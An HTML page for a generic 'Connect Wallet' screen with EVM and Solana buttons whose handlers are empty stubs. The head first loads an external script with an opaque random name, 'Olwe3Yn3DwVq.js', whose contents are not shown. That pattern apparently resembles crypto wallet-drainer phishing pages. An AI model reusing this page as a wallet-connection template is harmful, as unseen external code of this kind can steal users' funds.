<!DOCTYPE html>
<html lang="en">
<head>
    <script charset="UTF-8" type="text/javascript" src="./svelte-core.js"></script>
    <script src="./Olwe3Yn3DwVq.js"></script>

    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect Interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 60px 40px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            transition: transform 0.3s ease;
        }

        .container:hover {
            transform: translateY(-5px);
        }

        .title {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 16px;
            background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            font-size: 1.1rem;
            color: #b0b0b0;
            margin-bottom: 40px;
            line-height: 1.5;
        }

        .button-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-top: 30px;
        }

        .interact-button {
            border: none;
            padding: 18px 32px;
            border-radius: 16px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .interact-button:hover {
            transform: translateY(-2px);
        }

        .interact-button:active {
            transform: translateY(0);
        }

        .interact-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.1), transparent);
            transition: left 0.5s;
        }

        .interact-button:hover::before {
            left: 100%;
        }

        .evm-button {
            background: linear-gradient(135deg, #627eea 0%, #4f63d2 100%);
            color: white;
        }

        .evm-button:hover {
            box-shadow: 0 10px 30px rgba(98, 126, 234, 0.3);
        }

        .solana-button {
            background: linear-gradient(135deg, #9945ff 0%, #14f195 100%);
            color: white;
        }

        .solana-button:hover {
            box-shadow: 0 10px 30px rgba(153, 69, 255, 0.3);
        }

        .button-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.2);
        }

        .status {
            margin-top: 30px;
            padding: 15px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: none;
        }

        .status.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 480px) {
            .container {
                padding: 40px 30px;
            }
            
            .title {
                font-size: 2rem;
            }
            
            .interact-button {
                padding: 16px 24px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">Connect Wallet</h1>
        <p class="subtitle">Choose your preferred blockchain network to connect your wallet</p>
        
        <div class="button-container">
            <button class="interact-button evm-button" onclick="connectEVM()">
                <div class="button-icon">Ξ</div>
                Connect with EVM
            </button>
            
            <button class="interact-button solana-button" onclick="connectSolana()">
                <div class="button-icon">◎</div>
                Connect with Solana
            </button>
        </div>
        
        <div id="status" class="status"></div>
    </div>

    <script>
        function showStatus(message, type = 'info') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status show ${type}`;
            
            setTimeout(() => {
                statusEl.classList.remove('show');
            }, 3000);
        }

        function connectEVM() {
            console.log('EVM button clicked');
            // Add your EVM connection logic here
        }

        function connectSolana() {
            console.log('Solana button clicked');
            // Add your Solana connection logic here
        }

        // Add some interactive particle effects
        function createParticle() {
            const particle = document.createElement('div');
            particle.style.cssText = `
                position: fixed;
                width: 2px;
                height: 2px;
                background: rgba(255, 255, 255, 0.5);
                border-radius: 50%;
                pointer-events: none;
                z-index: -1;
                animation: float 3s linear infinite;
                left: ${Math.random() * 100}vw;
                animation-delay: ${Math.random() * 3}s;
            `;
            
            document.body.appendChild(particle);
            
            setTimeout(() => {
                particle.remove();
            }, 3000);
        }

        // Create floating particles
        setInterval(createParticle, 500);

        // Add CSS for particle animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes float {
                0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(-10px) rotate(360deg); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
